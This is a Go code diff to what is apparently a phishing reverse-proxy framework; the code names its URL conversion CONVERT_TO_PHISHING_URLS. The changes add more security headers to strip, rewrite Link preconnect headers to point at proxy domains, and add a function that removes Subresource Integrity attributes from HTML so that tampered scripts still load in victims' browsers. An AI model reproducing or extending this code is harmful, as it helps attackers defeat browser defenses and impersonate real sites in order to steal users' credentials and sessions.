@@ -871,9 +871,25 @@ func (m *ProxyHandler) rewriteResponseHeadersWithContext(resp *http.Response, re
 		"X-XSS-Protection",
 		"X-Content-Type-Options",
 		"X-Frame-Options",
+		"Cross-Origin-Opener-Policy-Report-Only",
+		"Reporting-Endpoints",
 	}
 	for _, header := range securityHeaders {
 		resp.Header.Del(header)
+	}
+
+	// rewrite Link preconnect/dns-prefetch headers to use proxy domains
+	if linkHeaders := resp.Header.Values("Link"); len(linkHeaders) > 0 {
+		resp.Header.Del("Link")
+		for _, link := range linkHeaders {
+			modified := link
+			for origHost, hostConfig := range reqCtx.ConfigMap {
+				if hostConfig.To != "" {
+					modified = strings.ReplaceAll(modified, origHost, hostConfig.To)
+				}
+			}
+			resp.Header.Add("Link", modified)
+		}
 	}
 
 	// fix cors headers
@@ -1000,6 +1016,11 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
 	body = m.applyURLPathRewrites(body, reqCtx)
 
+	// strip SRI integrity attributes from HTML since proxy modifies JS/CSS content
+	if strings.Contains(contentType, "text/html") {
+		body = m.stripSRIAttributes(body)
+	}
+
 	// build variables context for template interpolation
 	varCtx := m.buildVariablesContext(resp.Request.Context(), reqCtx.Session, reqCtx.ProxyConfig)
 	body = m.applyCustomReplacementsWithVariables(body, reqCtx.Session, reqCtx.TargetDomain, reqCtx.ProxyConfig, varCtx, contentType)
@@ -1107,6 +1128,9 @@ func (m *ProxyHandler) removeSecurityHeaders(resp *http.Response) {
 		"X-XSS-Protection",
 		"X-Content-Type-Options",
 		"X-Frame-Options",
+		"Cross-Origin-Opener-Policy-Report-Only",
+		"Reporting-Endpoints",
+		"Link",
 	}
 	for _, header := range headers {
 		resp.Header.Del(header)
@@ -1142,6 +1166,12 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 
 	body = m.patchUrls(configMap, body, CONVERT_TO_PHISHING_URLS)
 	body = m.applyURLPathRewritesWithoutSession(body, reqCtx)
+
+	// strip SRI integrity attributes from HTML since proxy modifies JS/CSS content
+	if strings.Contains(contentType, "text/html") {
+		body = m.stripSRIAttributes(body)
+	}
+
 	body = m.applyCustomReplacementsWithoutSession(body, configMap, reqCtx.TargetDomain, reqCtx.ProxyConfig, contentType)
 
 	// apply obfuscation if enabled
@@ -1174,6 +1204,15 @@ func (m *ProxyHandler) shouldCacheControlContent(contentType string) bool {
 	return strings.Contains(contentType, "text/html") ||
 		strings.Contains(contentType, "javascript") ||
 		strings.Contains(contentType, "application/json")
+}
+
+// stripSRIAttributes removes integrity attributes from <script> and <link> tags
+// because the proxy modifies JS/CSS content (domain rewrites) which changes file hashes,
+// causing browsers to reject the resources due to Subresource Integrity check failures.
+func (m *ProxyHandler) stripSRIAttributes(body []byte) []byte {
+	// match integrity='...' or integrity="..." with optional whitespace
+	sriPattern := regexp.MustCompile(`\s+integrity=['"][^'"]*['"]`)
+	return sriPattern.ReplaceAll(body, nil)
 }
 
 func (m *ProxyHandler) patchUrls(config map[string]service.ProxyServiceDomainConfig, body []byte, convertType int) []byte {
